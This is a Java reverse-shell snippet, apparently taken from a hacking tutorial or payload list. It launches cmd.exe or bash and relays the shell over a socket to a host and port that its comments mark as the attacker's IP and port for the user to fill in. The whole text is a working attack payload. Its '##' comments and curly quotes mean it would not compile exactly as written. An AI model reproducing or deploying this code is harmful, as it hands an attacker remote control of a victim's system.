
String host=”localhost”;                               ##attacker ip address goes here
int port=8044;                                         ## input the attacker port number
String cmd=”cmd.exe”;                                  ## you can change this to 'bash'
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);  ## socket for connection  
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();po.flush();Thread.sleep(50);
try {p.exitValue();break;}catch (Exception e){}};p.destroy();
s.close();
